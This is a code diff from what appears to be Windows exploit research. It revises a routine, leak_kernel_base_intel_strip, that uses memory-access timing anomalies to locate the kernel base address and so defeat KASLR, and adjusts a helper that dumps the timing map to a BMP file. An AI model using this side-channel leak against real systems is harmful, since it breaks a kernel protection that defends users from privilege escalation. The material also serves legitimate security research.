@@ -579,7 +579,7 @@ DWORD write_bmp_dword(HANDLE hFile, DWORD val) {
     return write_bmp(hFile, &val, 4);
 }
 
-void save_bmp(char* bmp_name, UINT64* data, size_t len) {
+void save_bmp(char* bmp_name, INT64* data, size_t len) {
     HANDLE hFile = CreateFileA(bmp_name,                // name of the write
         GENERIC_WRITE,          // open for writing
         0,                      // do not share
@@ -604,7 +604,8 @@ void save_bmp(char* bmp_name, UINT64* data, size_t len) {
     write_bmp_dword(hFile, 0); // misc
     write_bmp_dword(hFile, 0); // misc
 
-    UINT64 common = most_frequent(data, len);
+    INT64 common = most_frequent(data, len);
+    if (common == 0) { common = 1; }
     double min = common / 2;
     double max = common * 2;
     printf("Min: %f Max: %f  Common: %d \r\n", min, max, common);
@@ -712,11 +713,25 @@ UINT64 leak_kernel_base_intel_strip()
     }*/
 
     save_bmp("intel_strip.bmp", ANOMALY_MAP,ARR_SIZE);
-    UINT64 common = most_frequent(ANOMALY_MAP, ARR_SIZE);
-    double min = common / 2;
-    double max = common * 2;
-    for (UINT64 i = 0; i < ARR_SIZE; i++)
+    UINT64 anomaly_size = 0;
+    UINT64 fast_access = 0;
+    for (UINT64 j = 0; j< ARR_SIZE; j++)
     {
+        /*if (ANOMALY_MAP[j] != 0) {
+            printf("ANOMALY_MAP %llx : %d\r\n", (KERNEL_LOWER_BOUND + (j * STEP)), ANOMALY_MAP[j]);
+        }*/
+        if (ANOMALY_MAP[j] == 0) {
+            if (anomaly_size > 20 && fast_access > 3) {
+                return  (KERNEL_LOWER_BOUND + ((j-anomaly_size) * STEP));
+            }
+            anomaly_size = 0;
+            fast_access = 0;
+            continue;
+        }
+        if (ANOMALY_MAP[j] < 0) {
+            fast_access++;
+        }
+        anomaly_size++;
     }
     return 0;
 }
